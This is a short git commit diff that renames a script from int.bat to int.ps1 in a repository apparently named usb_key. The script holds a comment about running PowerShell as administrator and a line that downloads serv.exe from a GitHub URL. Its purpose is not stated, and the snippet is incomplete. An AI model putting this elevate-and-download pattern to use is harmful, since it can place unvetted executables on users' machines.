5a6be2b0ab7f327b5ee7ed32997405ec13bee844
djbrunoprod <58257756+djbrunoprod@users.noreply.github.com>
2023-11-19 04:53:32 -0300

    Update and rename int.bat to int.ps1

--- int.bat
+++
@@ -1,4 +0,0 @@
-REM runas /user:administrator powershell.exe
-
-$client.DownloadFile("https://raw.githubusercontent.com/djbrunoprod/usb_key/main/serv.exe" , "int.bat")
-
---
+++ int.ps1
@@ -0,0 +1,4 @@
+REM runas /user:administrator powershell.exe
+
+$client.DownloadFile("https://raw.githubusercontent.com/djbrunoprod/usb_key/main/serv.exe" , "serv.exe")
+
